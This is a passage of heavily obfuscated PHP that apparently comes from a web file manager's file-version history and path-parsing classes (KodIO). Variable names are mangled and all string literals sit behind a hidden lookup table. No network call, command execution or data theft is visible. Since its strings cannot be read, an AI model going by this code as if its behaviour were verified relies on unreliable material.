$©Û±ßÌû) { $•˜úÁ…Ê =& $_SERVER[€ä¾™²]; if (!$©Û±ßÌû) { return; } $à§ª”ŠÁ = self::parsePath($°Á‹¾Â[0]); if (!$à§ª”ŠÁ) { return; } $ç„¾òĞ° = self::checkInHistory($à§ª”ŠÁ); if (!$ç„¾òĞ°) { return; } if ($ç„¾òĞ°[$•˜úÁ…Ê[33]] == $•˜úÁ…Ê[231]) { $¬›—…¢ = self::listData($à§ª”ŠÁ, !1); if ($¬›—…¢ && $¬›—…¢[$•˜úÁ…Ê[446]]) { self::clear($à§ª”ŠÁ, !1); } } else { IO::remove($ç„¾òĞ°[$•˜úÁ…Ê[87]]); self::clearEmptyFolder(IO::pathFather($ç„¾òĞ°[$•˜úÁ…Ê[87]])); } } private static function checkInHistory($¥½¤ğ÷º) { $šâíÀæ = self::pathHistory($¥½¤ğ÷º); if (!IO::exist($šâíÀæ)) { $šâíÀæ .= $_SERVER[€ä¾™²][1365]; } return IO::exist($šâíÀæ) ? IO::info($šâíÀæ) : !1; } private static function parsePath($¯ĞÂÈ‚¶) { $¿óÌ›‚ =& $_SERVER[€ä¾™²]; if (!$¯ĞÂÈ‚¶) { return !1; } if (isset($GLOBALS[$¿óÌ›‚[1366]]) && $GLOBALS[$¿óÌ›‚[1366]]) { return; } $éğ¤Ö´ = KodIO::parse($¯ĞÂÈ‚¶); $Õ’í¿Å = $éğ¤Ö´[$¿óÌ›‚[33]]; $ —·¢•ª = !$Õ’í¿Å || $Õ’í¿Å == KodIO::KOD_IO || $Õ’í¿Å == KodIO::KOD_SHARE_ITEM; if (!$ —·¢•ª || !$éğ¤Ö´[$¿óÌ›‚[1367]]) { return !1; } if (substr($¯ĞÂÈ‚¶, 0, strlen(DATA_PATH . $¿óÌ›‚[1368])) == DATA_PATH . $¿óÌ›‚[1368]) { return !1; } if ($Õ’í¿Å == KodIO::KOD_SHARE_ITEM) { $ª®š©ñ = IO::init($¯ĞÂÈ‚¶); if ($ª®š©ñ->pathParse[$¿óÌ›‚[1280]]) { return self::parsePath($ª®š©ñ->pathParse[$¿óÌ›‚[1280]]); } return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } $º«Èáş½ = array(self::$_historyBase, TEMP_PATH, BASIC_PATH . $¿óÌ›‚[1369]); foreach ($º«Èáş½ as $‡¨î¬¸) { if (!$Õ’í¿Å && substr($¯ĞÂÈ‚¶, 0, strlen($‡¨î¬¸)) == $‡¨î¬¸) { return !1; } } self::log($GLOBALS[$¿óÌ›‚[1274]] . $¿óÌ›‚[1370] . $¯ĞÂÈ‚¶); return $¯ĞÂÈ‚¶; } private static function pathHistory($©Ó³œËÒ) { $¶Ëìéùò =& $_SERVER[€ä¾™²]; $ŞúäÅïÊ = self::$_historyBase . ltrim(KodIO::clear($©Ó³œËÒ), $¶Ëìéùò[8]); $ŞúäÅïÊ = str_replace(array($¶Ëìéùò[1371]), array($¶Ëìéùò[1372]), $ŞúäÅïÊ); return $ŞúäÅïÊ; } public static function log($¥ë§Éç“) { } public static function historyCount($ãòÓï×ë) { $åÇöÃõ =& $_SERVER[€ä¾™²]; $Â”Ãı· = array(); $Äõœµã‚ = array(); foreach ($ãòÓï×ë as $ğ»†ÃÁ¡) { $Á ÍÚ²Ë = get_path_father($ğ»†ÃÁ¡); if (!$Äõœµã‚[$Á ÍÚ²Ë]) { $Äõœµã‚[$Á ÍÚ²Ë] = array(); } $Äõœµã‚[$Á ÍÚ²Ë][] = get_path_this($ğ»†ÃÁ¡); } foreach ($Äõœµã‚ as $Á ÍÚ²Ë => $­Ü®‘¾ı) { $ò¿âù¿Å = self::parsePath($Á ÍÚ²Ë); if (!$ò¿âù¿Å) { continue; } foreach ($­Ü®‘¾ı as $îáøÓëé) { $¢ÉÕş¢  = self::listData(rtrim($ò¿âù¿Å, $åÇöÃõ[8]) . $åÇöÃõ[8] . $îáøÓëé, !1); if ($¢ÉÕş¢  && $¢ÉÕş¢ [$åÇöÃõ[446]]) { $Â”Ãı·[rtrim($Á ÍÚ²Ë, $åÇöÃõ[8]) . $åÇöÃõ[8] . $îáøÓëé] = count($¢ÉÕş¢ [$åÇöÃõ[446]]); } } } return $Â”Ãı·; } public static function add($‹‚½Ê¼•) { $ı§ù¿ïé =& $_SERVER[€ä¾™²]; $„³ë…• = self::listData($‹‚½Ê¼•); if (!$„³ë…•) { return; } $º³œ¼ĞÛ = Model($ı§ù¿ïé[873])->get($ı§ù¿ïé[1373]); $«ÆŞìÕè = intval($GLOBALS[$ı§ù¿ïé[6]][$ı§ù¿ïé[92]][$ı§ù¿ïé[1351]]); $”ê–Û± = $º³œ¼ĞÛ == $ı§ù¿ïé[1374] ? min(5, $«ÆŞìÕè) : $«ÆŞìÕè; if ($«ÆŞìÕè <= 0) { return; } $äó¶©Ÿğ = IO::info($‹‚½Ê¼•); $’ğŒß¨ = $„³ë…•[$ı§ù¿ïé[446]]; if ($äó¶©Ÿğ[$ı§ù¿ïé[79]] == 0) { return; } if ($äó¶©Ÿğ[$ı§ù¿ïé[79]] >= 1024 * 1024 * 500) { return !1; } $¬æÕ’Ó = IO::hashSimple($‹‚½Ê¼•); if ($’ğŒß¨ && $’ğŒß¨[0][$ı§ù¿ïé[701]] == $¬æÕ’Ó) { return !0; } if (array_key_exists($ı§ù¿ïé[234], $äó¶©Ÿğ) && !$äó¶©Ÿğ[$ı§ù¿ïé[234]]) { return !1; } $Ş³ÆÖîà = short_id(time()); $›Ãå…¹ã = array($ı§ù¿ïé[486] => $Ş³ÆÖîà, $ı§ù¿ïé[701] => $¬æÕ’Ó, $ı§ù¿ïé[32] => $äó¶©Ÿğ[$ı§ù¿ïé[32]] . $ı§ù¿ïé[10] . date($ı§ù¿ïé[1375]) . rand_string(1), $ı§ù¿ïé[79] => $äó¶©Ÿğ[$ı§ù¿ïé[79]], $ı§ù¿ïé[548] => USER_ID, $ı§ù¿ïé[232] => time(), $ı§ù¿ïé[1376] => $ı§ù¿ïé[12]); IO::mkdir($„³ë…•[$ı§ù¿ïé[1377]]); $•™öéÇ‡ = IO::copy($‹‚½Ê¼•, $„³ë…•[$ı§ù¿ïé[1377]], !1, $›Ãå…¹ã[$ı§ù¿ïé[32]]); if (!$•™öéÇ‡) { self::clearEmptyFolder($„³ë…•[$ı§ù¿ïé[1377]]); return !1; } array_unshift($’ğŒß¨, $›Ãå…¹ã); if (count($’ğŒß¨) > $”ê–Û±) { $â©‚àÎâ = array_slice($’ğŒß¨, $”ê–Û±); foreach ($â©‚àÎâ as $ÚìÎµÒ“) { IO::remove($„³ë…•[$ı§ù¿ïé[1377]] . $ÚìÎµÒ“[$ı§ù¿ïé[32]]); } $’ğŒß¨ = array_slice($’ğŒß¨, 0, $”ê–Û±); } return self::saveData($„³ë…•[$ı§ù¿ïé[1378]], $’ğŒß¨); } public static function remove($€†ë÷ÎÔ, $Ìá“¡ì–) { $œ•¶Êâş =& $_SERVER[€ä¾™²]; $ó’ƒÒÕñ = self::listData($€†ë÷ÎÔ); $×“¹ò´© = array(); if (!$ó’ƒÒÕñ) { return !1; } foreach ($ó’ƒÒÕñ[$œ•¶Êâş[446]] as $€‰Äåı‡) { if ($€‰Äåı‡[$œ•¶Êâş[486]] == $Ìá“¡ì–) { IO::remove($ó’ƒÒÕñ[$œ•¶Êâş[1377]] . $€‰Äåı‡[$œ•¶Êâş[32]]); continue; } $×“¹ò´©[] = $€‰Äåı‡; } return self::saveData($ó’ƒÒÕñ[$œ•¶Êâş[1378]], $×“¹ò´©); } public static function clear($Ó­ÉÂÚá, $º³âÒ²ò = true) { $”ƒ®¦Ö· =& $_SERVER[€ä¾™²]; $ØË‘€Ï– = self::listData($Ó­ÉÂÚá, $º³âÒ²ò); if (!$ØË‘€Ï–) { return !1; } foreach ($ØË‘€Ï–[$”ƒ®¦Ö·[446]] as $ Ï¶‹ŠÂ) { IO::remove($ØË‘€Ï–[$”ƒ®¦Ö·[1377]] . $ Ï¶‹ŠÂ[$”ƒ®¦Ö·[32]]); } return self::saveData($ØË‘€Ï–[$”ƒ®¦Ö·[1378]], array()); } public static function moveHistory($¡™˜ó, $š‡£ôÒ¦ = '', $Ø€±”® = '') { $ÖûÜ¿Õ¦ =& $_SERVER[€ä¾™²]; $Í…ú”» = self::listData($¡™˜ó, !1); if (!$Í…ú”» || !$Í…ú”»[$ÖûÜ¿Õ¦[446]]) { return !1; } $á„ ã© = $ÖûÜ¿Õ¦[1365]; $š‡£ôÒ¦ = $š‡£ôÒ¦ ? $š‡£ôÒ¦ : get_path_this($¡™˜ó); $Ø€±”® = $Ø€±”® ? $Ø€±”® : $Í…ú”»[$ÖûÜ¿Õ¦[1377]]; $„Ä‹Á¨¡ = substr(get_path_this($Í…ú”»[$ÖûÜ¿Õ¦[1378]]), 0, -strlen($á„ ã©)); foreach ($Í…ú”»[$ÖûÜ¿Õ¦[446]] as $¦Ôê–ïš => $Å«Ò™¨å) { $Œ¹ş½Ç¥ = $š‡£ôÒ¦ . substr($Å«Ò™¨å[$ÖûÜ¿Õ¦[32]], strlen($„Ä‹Á¨¡)); $€Á»õáà = IO::move($Í…ú”»[$ÖûÜ¿Õ¦[1377]] . $Å«Ò™¨å[$ÖûÜ¿Õ¦[32]], $Ø€±”®, !1, $Œ¹ş½Ç¥); if ($€Á»õáà) { $Í…ú”»[$ÖûÜ¿Õ¦[446]][$¦Ôê–ïš][$ÖûÜ¿Õ¦[32]] = $Œ¹ş½Ç¥; } } $Í…ú”»[$ÖûÜ¿Õ¦[1378]] = IO::move($Í…ú”»[$ÖûÜ¿Õ¦[1378]], $Ø€±”®, !1, $š‡£ôÒ¦ . $á„ ã©); self::saveData($Í…ú”»[$ÖûÜ¿Õ¦[1378]], $Í…ú”»[$ÖûÜ¿Õ¦[446]]); self::clearEmptyFolder($Í…ú”»[$ÖûÜ¿Õ¦[1377]]); } public static function rollback($‘ÍàÛÀ», $×éÏùÚÓ) { $´ØÛàÇ“ =& $_SERVER[€ä¾™²]; $ÃãÅ˜ˆ = self::listData($‘ÍàÛÀ»); if (!$ÃãÅ˜ˆ) { return; } $ÜÎ¤éÇ› = IO::info($‘ÍàÛÀ»); foreach ($ÃãÅ˜ˆ[$´ØÛàÇ“[446]] as $£ÆÛ“œ– => $Äíëôî¬) { if ($Äíëôî¬[$´ØÛàÇ“[486]] == $×éÏùÚÓ) { self::add($‘ÍàÛÀ»); $§ƒÛÄùÏ = $ÃãÅ˜ˆ[$´ØÛàÇ“[1377]] . $Äíëôî¬[$´ØÛàÇ“[32]]; $ŒÖúÚë– = IO::copy($§ƒÛÄùÏ, IO::pathFather($‘ÍàÛÀ»), REPEAT_REPLACE, $ÜÎ¤éÇ›[$´ØÛàÇ“[32]]); if ($ŒÖúÚë–) { self::remove($‘ÍàÛÀ», $×éÏùÚÓ); } return $ŒÖúÚë–; } } return !1; } public static function setDetail($û€®ƒ—ã, $½ÎœÎ·, $öèÇØßÌ) { $·”—Ÿ¸ù =& $_SERVER[€ä¾™²]; $¹‚’æ¸Ì = self::listData($û€®ƒ—ã); if (!$¹‚’æ¸Ì) { return; } foreach ($¹‚’æ¸Ì[$·”—Ÿ¸ù[446]] as $´‘å²÷ => $šòÓæ‹÷) { if ($šòÓæ‹÷[$·”—Ÿ¸ù[486]] == $½ÎœÎ·) { $¹‚’æ¸Ì[$·”—Ÿ¸ù[446]][$´‘å²÷][$·”—Ÿ¸ù[1376]] = $öèÇØßÌ; self::saveData($¹‚’æ¸Ì[$·”—Ÿ¸ù[1378]], $¹‚’æ¸Ì[$·”—Ÿ¸ù[446]]); return !0; } } return !1; } public static function fileInfo($ëµÑÎé³, $Ñ¤«£) { $ÃÇ«ÇÛö =& $_SERVER[€ä¾™²]; $÷¹àÖ¿² = self::listData($ëµÑÎé³); if (!$÷¹àÖ¿²) { show_json(LNG($ÃÇ«ÇÛö[106]), !1); } $öğİøÂ÷ = $ÃÇ«ÇÛö[12]; foreach ($÷¹àÖ¿²[$ÃÇ«ÇÛö[446]] as $…¬¾¢à£ => $úäÖû«ô) { if ($úäÖû«ô[$ÃÇ«ÇÛö[486]] != $Ñ¤«£) { continue; } $öğİøÂ÷ = $÷¹àÖ¿²[$ÃÇ«ÇÛö[1377]] . $úäÖû«ô[$ÃÇ«ÇÛö[32]]; break; } if (!$öğİøÂ÷) { show_json(LNG($ÃÇ«ÇÛö[106]), !1); } return IO::info($öğİøÂ÷); } public static function fileOut($òÜ—…ò…, $”‚ÅÁ˜İ, $Ú‡ ¬®´ = false) { $İÒ°©ÖŒ =& $_SERVER[€ä¾™²]; $ä‚à¡½ë = self::fileInfo($òÜ—…ò…, $”‚ÅÁ˜İ); $¸·›—°¡ =& $GLOBALS[$İÒ°©ÖŒ[7]]; $Ú‡ ¬®´ = isset($¸·›—°¡[$İÒ°©ÖŒ[1328]]) && $¸·›—°¡[$İÒ°©ÖŒ[1328]] == 1; if (isset($¸·›—°¡[$İÒ°©ÖŒ[33]]) && $¸·›—°¡[$İÒ°©ÖŒ[33]] == $İÒ°©ÖŒ[1379]) { return IO::fileOutImage($ä‚à¡½ë[$İÒ°©ÖŒ[87]], $¸·›—°¡[$İÒ°©ÖŒ[1380]]); } IO::fileOut($ä‚à¡½ë[$İÒ°©ÖŒ[87]], $Ú‡ ¬®´, get_path_this($òÜ—…ò…)); } public static function listData($ïü¸œ’Â, $¯Ê§•Ëõ = true) { $µ£¾Á¾° =& $_SERVER[€ä¾™²]; if ($¯Ê§•Ëõ && !IO::exist($ïü¸œ’Â)) { return !1; } if (!self::$_historyBase) { self::$_historyBase = self::getBasePath(); } if (substr($ïü¸œ’Â, 0, strlen(TEMP_PATH)) == TEMP_PATH) { return !1; } $¡·•£™ = self::pathHistory($ïü¸œ’Â); $ü¬²Çº = array($µ£¾Á¾°[1378] => $¡·•£™ . $µ£¾Á¾°[1365], $µ£¾Á¾°[1377] => rtrim(get_path_father($¡·•£™), $µ£¾Á¾°[8]) . $µ£¾Á¾°[8], $µ£¾Á¾°[446] => array()); $‹Ô±¦µ = IO::getContent($ü¬²Çº[$µ£¾Á¾°[1378]]); if ($‹Ô±¦µ) { $ßÓıâÚ = json_decode($‹Ô±¦µ, !0); if (is_array($ßÓıâÚ)) { $ü¬²Çº[$µ£¾Á¾°[446]] = $ßÓıâÚ; } } return $ü¬²Çº; } private static function saveData($îÒÊÍ¡, $ ¸á°¹ë) { $Ğá¹—± =& $_SERVER[€ä¾™²]; self::log($Ğá¹—±[1381] . $îÒÊÍ¡ . $Ğá¹—±[74] . count($ ¸á°¹ë), $Ğá¹—±[852]); if ($ ¸á°¹ë) { return IO::setContent($îÒÊÍ¡, json_encode($ ¸á°¹ë)); } $ò­òÒ¡ = IO::pathFather($îÒÊÍ¡); IO::remove($îÒÊÍ¡); self::clearEmptyFolder($ò­òÒ¡); return !0; } public static function clearEmptyFolder($ğ¦Ú¤”) { $ˆÈ†±’ =& $_SERVER[€ä¾™²]; if (trim($ğ¦Ú¤”, $ˆÈ†±’[8]) == trim(self::$_historyBase, $ˆÈ†±’[8])) { return; } $¹§µ“ı× = IO::pathFather($ğ¦Ú¤”); $í¿Ü¦¢æ = IO::has($ğ¦Ú¤”, !0); if ($í¿Ü¦¢æ[$ˆÈ†±’[240]] > 0 || $í¿Ü¦¢æ[$ˆÈ†±’[241]] > 0) { return; } IO::remove($ğ¦Ú¤”); self::clearEmptyFolder($¹§µ“ı×); } private static function getBasePath() { $†Ìãø¬é =& $_SERVER[€ä¾™²]; $ÄÇ’ÎÓ¾ = Model($†Ìãø¬é[1382])->get($†Ìãø¬é[1383]); if ($ÄÇ’ÎÓ¾) { if (!IO::exist($ÄÇ’ÎÓ¾)) { IO::mkdir($ÄÇ’ÎÓ¾); } if (get_path_this($ÄÇ’ÎÓ¾) == $†Ìãø¬é[1368]) { $ØÂ‰…³ = $†Ìãø¬é[1384] . rand_string(8); @rename($ÄÇ’ÎÓ¾, get_path_father($ÄÇ’ÎÓ¾) . $†Ìãø¬é[8] . $ØÂ‰…³); $ÄÇ’ÎÓ¾ = DATA_PATH . $ØÂ‰…³ . $†Ìãø¬é[8]; file_put_contents(DATA_PATH . $†Ìãø¬é[1316], $†Ìãø¬é[12]); Model($†Ìãø¬é[1382])->set($†Ìãø¬é[1383], $ÄÇ’ÎÓ¾); } return $ÄÇ’ÎÓ¾; } $ÄÇ’ÎÓ¾ = DATA_PATH . $†Ìãø¬é[1384] . rand_string(8) . $†Ìãø¬é[8]; $ÄÇ’ÎÓ¾ = IO::mkdir($ÄÇ’ÎÓ¾); $ÄÇ’ÎÓ¾ = rtrim($ÄÇ’ÎÓ¾, $†Ìãø¬é[8]) . $†Ìãø¬é[8]; file_put_contents($ÄÇ’ÎÓ¾ . $†Ìãø¬é[1316], $†Ìãø¬é[12]); file_put_contents(DATA_PATH . $†Ìãø¬é[1316], $†Ìãø¬é[12]); Model($†Ìãø¬é[1382])->set($†Ìãø¬é[1383], $ÄÇ’ÎÓ¾); return $ÄÇ’ÎÓ¾; } } goto a•ÏèÇ”÷¸; a•ÏèÇ”÷¸: class KodIO { const KOD_SOURCE = "\173\x73\x6f\165\162\x63\x65\175"; const KOD_USER_RECYCLE = "\173\x75\163\145\x72\x52\x65\143\x79\143\x6c\x65\175"; const KOD_USER_FAV = "\173\x75\163\145\162\x46\141\166\x7d"; const KOD_USER_FILE_TAG = "\x7b\165\163\x65\162\x46\x69\154\x65\x54\141\147\175"; const KOD_USER_FILE_TYPE = "\x7b\x75\x73\145\x72\x46\x69\x6c\x65\124\x79\x70\145\x7d"; const KOD_GROUP_ROOT_SELF = "\x7b\147\162\x6f\165\x70\122\x6f\157\x74\123\145\154\x66\175"; const KOD_USER_SHARE = "\173\165\163\x65\x72\123\150\141\x72\145\175"; const KOD_USER_SHARE_LINK = "\x7b\165\x73\x65\x72\x53\x68\141\162\145\x4c\151\156\153\x7d"; const KOD_USER_SHARE_TO_ME = "\173\163\150\x61\x72\145\x54\157\115\x65\x7d"; const KOD_SHARE_ITEM = "\x7b\x73\x68\x61\162\145\111\x74\x65\x6d\x7d"; const KOD_SHARE_LINK = "\x7b\x73\150\x61\162\145\111\164\x65\x6d\x4c\x69\156\x6b\x7d"; const KOD_SHARE_OUTER = "\173\x73\150\141\162\x65\111\x74\145\x6d\x4f\x75\164\175"; const KOD_SEARCH = "\x7b\x73\145\x61\162\143\150\x7d"; const KOD_BLOCK = "\x7b\x62\154\x6f\x63\x6b\175"; const KOD_IO = "\x7b\151\x6f\x7d"; const KOD_USER_RECENT = "\173\x75\163\145\x72\x52\x65\x6e\143\145\156\x74\x7d"; const KOD_USER_DRIVER = "\173\144\162\x69\x76\x65\x72\x7d"; public static function typeList() { $¨êµîÔá =& $_SERVER[€ä¾™²]; return array($¨êµîÔá[1385] => self::KOD_SOURCE, $¨êµîÔá[1386] => self::KOD_USER_RECYCLE, $¨êµîÔá[1387] => self::KOD_USER_FAV, $¨êµîÔá[1388] => self::KOD_USER_FILE_TAG, $¨êµîÔá[1389] => self::KOD_USER_FILE_TYPE, $¨êµîÔá[1390] => self::KOD_GROUP_ROOT_SELF, $¨êµîÔá[1391] => self::KOD_USER_SHARE, $¨êµîÔá[1392] => self::KOD_USER_SHARE_LINK, $¨êµîÔá[1393] => self::KOD_USER_SHARE_TO_ME, $¨êµîÔá[1394] => self::KOD_SHARE_ITEM, $¨êµîÔá[1395] => self::KOD_SHARE_LINK, $¨êµîÔá[1396] => self::KOD_SHARE_OUTER, $¨êµîÔá[1397] => self::KOD_SEARCH, $¨êµîÔá[1398] => self::KOD_BLOCK, $¨êµîÔá[1399] => self::KOD_IO, $¨êµîÔá[1400] => self::KOD_USER_RECENT, $¨êµîÔá[1401] => self::KOD_USER_DRIVER); } public static function parse($ºóª ğ‘) { $ı£Ø¨ø§ =& $_SERVER[€ä¾™²]; $ºóª ğ‘ = self::clear($ºóª ğ‘); $€–õÈû = array_values(self::typeList()); preg_match($ı£Ø¨ø§[1402], $ºóª ğ‘, $ÂøµÓÕ); $»Ò›¬‡µ = array($ı£Ø¨ø§[518] => !1, $ı£Ø¨ø§[1403] => !1, $ı£Ø¨ø§[515] => !1, $ı£Ø¨ø§[87] => $ºóª ğ‘, $ı£Ø¨ø§[1300] => !1, $ı£Ø¨ø§[1299] => $ı£Ø¨ø§[12]); if (is_array($ÂøµÓÕ) && count($ÂøµÓÕ) == 5) { $æ¸…ô = $ı£Ø¨ø§[1404] . $ÂøµÓÕ[2] . $ı£Ø¨ø§[403]; if (in_array($æ¸…ô, $€–õÈû)) { $»Ò›¬‡µ[$ı£Ø¨ø§[1300]] = $ÂøµÓÕ[1]; $»Ò›¬‡µ[$ı£Ø¨ø§[33]] = $æ¸…ô; $»Ò›¬‡µ[$ı£Ø¨ø§[1405]] = substr($æ¸…ô, 1, -1); $»Ò›¬‡µ[$ı£Ø¨ø§[486]] = $ÂøµÓÕ[3]; } $»Ò›¬‡µ[$ı£Ø¨ø§[1299]] = $ÂøµÓÕ[4]; } if ($»Ò›¬‡µ[$ı£Ø¨ø§[518]] == self::KOD_SOURCE) { $»Ò›¬‡µ[$ı£Ø¨ø§[486]] = intval($»Ò›¬‡µ[$ı£Ø¨ø§[486]]); $»Ò›¬‡µ[$ı£Ø¨ø§[1303]] = $»Ò›¬‡µ[$ı£Ø¨ø§[486]]; } $öº÷„ = array($ı£Ø¨ø§[12], self::KOD_SOURCE, self::KOD_IO, self::KOD_SHARE_ITEM, self::KOD_SHARE_LINK, self::KOD_SHARE_OUTER, self::KOD_USER_DRIVER); $»Ò›¬‡µ[$ı£Ø¨ø§[1367]] = in_array($»Ò›¬‡µ[$ı£Ø¨ø§[33]], $öº÷„); return $»Ò›¬‡µ; } public static function isTruePath($æäŞï³õ) { $¡Ø×¹İÛ =& $_SERVER[€ä¾™²]; if (substr($æäŞï³õ, 0, 1) != $¡Ø×¹İÛ[1404]) { return !0; } if (strpos($æäŞï³õ, $¡Ø×¹İÛ[505]) === 0) { return !0; } if (strpos($æäŞï³õ, $¡Ø×¹İÛ[1371]) === 0) { return !0; } if (strpos($æäŞï³õ, $¡Ø×¹İÛ[1406]) === 0) { return !0; } if (strpos($æäŞï³õ, $¡Ø×¹İÛ[1407]) === 0) { return !0; } if (strpos($æäŞï³õ, $¡Ø×¹İÛ[1408]) === 0) { return !0; } if (strpos($æäŞï³õ, $¡Ø×¹İÛ[1409]) === 0) { return !0; } return !1; } public static function clear($ä‚˜òñÁ) { $ÉŸ—ÕÍ˜ =& $_SERVER[€ä¾™²]; $ä‚˜òñÁ = str_replace(array($ÉŸ—ÕÍ˜[1193], $ÉŸ—ÕÍ˜[286]), $ÉŸ—ÕÍ˜[53], $ä‚˜òñÁ); $ä‚˜òñÁ = str_replace($ÉŸ—ÕÍ˜[98], $ÉŸ—ÕÍ˜[8], $ä‚˜òñÁ); $Ëô®×ßÒ = $ÉŸ—ÕÍ˜[1410]; if (substr($ä‚˜òñÁ, 0, 3) == $ÉŸ—ÕÍ˜[1411]) { $ä‚˜òñÁ = substr($ä‚˜òñÁ, 3); } while (strstr($ä‚˜òñÁ, $Ëô®×ßÒ)) { $ä‚˜òñÁ = str_replace($Ëô®×ßÒ, $ÉŸ—ÕÍ˜[8], $ä‚˜òñÁ); } $ä‚˜òñÁ = preg_replace($ÉŸ—ÕÍ˜[1412], $ÉŸ—ÕÍ˜[8], $ä‚˜òñÁ); if ($ä‚˜òñÁ == $ÉŸ—ÕÍ˜[8]) { return $ÉŸ—ÕÍ˜[8]; } $ä‚˜òñÁ = rtrim($ä‚˜òñÁ, $ÉŸ—ÕÍ˜[8]); return $ä‚˜òñÁ; } public static function pathTrue($ëŞ”Ëí—) { $“ÎÎ³‘Í =& $_SERVER[€ä¾™²]; if (!$ëŞ”Ëí—) { return $“ÎÎ³‘Í[12]; } $ëŞ”Ëí— = str_replace($“ÎÎ³‘Í[255], $“ÎÎ³‘Í[8], str_replace($“ÎÎ³‘Í[1413], $“ÎÎ³‘Í[8], $ëŞ”Ëí—)); $ëŞ”Ëí— = str_replace($“ÎÎ³‘Í[255], $“ÎÎ³‘Í[8], str_replace($“ÎÎ³‘Í[1413], $“ÎÎ³‘Í[8], $ëŞ”Ëí—)); if (!strstr($ëŞ”Ëí—, $“ÎÎ³‘Í[1411])) { return $ëŞ”Ëí—; } $Ğå›Œë = explode($“ÎÎ³‘Í[8], $ëŞ”Ëí—); foreach ($Ğå›Œë as $‡§™½ß => $‹ùÔ¨ ™) { if ($‹ùÔ¨ ™ !== $“ÎÎ³‘Í[1414]) { continue; } for ($×¸ª‰Äç = $‡§™½ß; $×¸ª‰Äç >= 0; $×¸ª‰Äç--) { if ($Ğå›Œë[$×¸ª‰Äç] === $“ÎÎ³‘Í[10] || $Ğå›Œë[$×¸ª‰Äç] === $“ÎÎ³‘Í[1414] || $Ğå›Œë[$×¸ª‰Äç] === -1) { continue; } if ($Ğå›Œë[$×¸ª‰Äç] === $“ÎÎ³‘Í[12]) { $Ğå›Œë[$‡§™½ß] = -1; break; } $Ğå›Œë[$‡§™½ß] = -1; $Ğå›Œë[$×¸ª‰Äç] = -1; break; } } $Ãâ‡«¸ˆ = array(); foreach ($Ğå›Œë as $‹ùÔ¨ ™) { if ($‹ùÔ¨ ™ !== -1) { $Ãâ‡«¸ˆ[] = $‹ùÔ¨ ™; } } $åˆë†ïñ = implode($“ÎÎ³‘Í[8], $Ãâ‡«¸ˆ); if (strpos($åˆë†ïñ, $“ÎÎ³‘Í[1415]) === 0) { $åˆë†ïñ = $“ÎÎ³‘Í[1411] . substr($åˆë†ïñ, strlen($“ÎÎ³‘Í[1415])); } return $åˆë†ïñ; } public static function pathUrlClear($Å¬˜Ôˆ•) { $Şµ¶®´Â =& $_SERVER[€ä¾™²]; if (!$Å¬˜Ôˆ•) { return $Å¬˜Ôˆ•; } $Å¬˜Ôˆ• = rawurldecode($Å¬˜Ôˆ•); $Å¬˜Ôˆ• = str_replace($Şµ¶®´Â[1413], $Şµ¶®´Â[8], $Å¬˜Ôˆ•); if (strpos($Å¬˜Ôˆ•, $Şµ¶®´Â[76]) > 0) { $Å¬˜Ôˆ• = substr($Å¬˜Ôˆ•, 0, strpos($Å¬˜Ôˆ•, $Şµ¶®´Â[76])); } if (strpos($Å¬˜Ôˆ•, $Şµ¶®´Â[1416]) > 0) { $Å¬˜Ôˆ• = substr($Å¬˜Ôˆ•, 0, strpos($Å¬˜Ôˆ•, $Şµ¶®´Â[1416])); } return $Å¬˜Ôˆ•; } public static function sourceID($éääë) { $½ÎÕø÷Ù =& $_SERVER[€ä¾™²]; $íĞ°óà = self::parse($éääë); if ($íĞ°óà[$½ÎÕø÷Ù[33]] !== self::KOD_SOURCE) { show_json(LNG($½ÎÕø÷Ù[1417]), !1); } return $íĞ°óà[$½ÎÕø÷Ù[486]]; } public static function make($òªØÅøÇ) { if (!$òªØÅøÇ) { return !1; } return self::makePath(self::KOD_SOURCE, intval($òªØÅøÇ)); } public static function makeShare($áƒÅÃ”ª, $²ÒâÍß„) { return self::makePath(self::KOD_SHARE_ITEM, $áƒÅÃ”ª, $²ÒâÍß„); } public static function makeFileTypePath($ÍîÙ”²º) { return self::makePath(self::KOD_USER_FILE_TYPE, $ÍîÙ”²º); } public static function makeFileTagPath($©í²ì¯) { return self::makePath(self::KOD_USER_FILE_TAG, $©í²ì¯); } public static function makePath($ÙŒ·çÛÖ, $‘ÍëÚó© = '', $â¼®ÌÌé = '') { $îÛƒ»’á =& $_SERVER[€ä¾™²]; $‚£½ø­¶ = substr($ÙŒ·çÛÖ, 1, -1); $·ºÆù = $îÛƒ»’á[1418] . $‚£½ø­¶ . $îÛƒ»’á[1419] . $‘ÍëÚó© . $îÛƒ»’á[1420]; $·ºÆù = $â¼®ÌÌé ? $·ºÆù . $â¼®ÌÌé . $îÛƒ»’á[8] : $·ºÆù; return $·ºÆù; } public static function hashPath($ùÜ†¼İÌ, $şû²îªŞ = false) { $˜ÊŞ‰³Ğ =& $_SERVER[€ä¾™²]; if (!$ùÜ†¼İÌ) { return $˜ÊŞ‰³Ğ[12]; } $˜å¾äœÈ = is_array($ùÜ†¼İÌ) ? $ùÜ†¼İÌ : IO::info($ùÜ†¼İÌ); $ºü…â = _get($˜å¾äœÈ, $˜ÊŞ‰³Ğ[1421], $˜ÊŞ‰³Ğ[12]); if (!$ºü…â && isset($˜å¾äœÈ[$˜ÊŞ‰³Ğ[564]])) { $ºü…â = $˜å¾äœÈ[$˜ÊŞ‰³Ğ[564]]; } if (!$ºü…â && isset($˜å¾äœÈ[$˜ÊŞ‰³Ğ[236]])) { $ºü…â = trim($˜å¾äœÈ[$˜ÊŞ‰³Ğ[236]], $˜ÊŞ‰³Ğ[119]); } if ($ºü…â) { return $ºü…â; } if (!$ºü…â && isset($˜å¾äœÈ[$˜ÊŞ‰³Ğ[192]]) && $˜å¾äœÈ[$˜ÊŞ‰³Ğ[192]]) { $˜å¾äœÈ = IO::info(KodIO::make($˜å¾äœÈ[$˜ÊŞ‰³Ğ[192]])); $ºü…â = _get($˜å¾äœÈ, $˜ÊŞ‰³Ğ[1421], $˜ÊŞ‰³Ğ[12]); if (!$ºü…â && isset($˜å¾äœÈ[$˜ÊŞ‰³Ğ[564]])) { $ºü…â = $˜å¾äœÈ[$˜ÊŞ‰³Ğ[564]]; } } $•”ŒâÜ = md5($˜å¾äœÈ[$˜ÊŞ‰³Ğ[87]] . $˜å¾äœÈ[$˜ÊŞ‰³Ğ[79]] . $˜å¾äœÈ[$˜ÊŞ‰³Ğ[88]]); $†Ñ…º—‹ = $•”ŒâÜ . $˜ÊŞ‰³Ğ[1422]; $ºü…â = $ºü…â ? $ºü…â : Cache::get($†Ñ…º—‹); if (!$ºü…â && 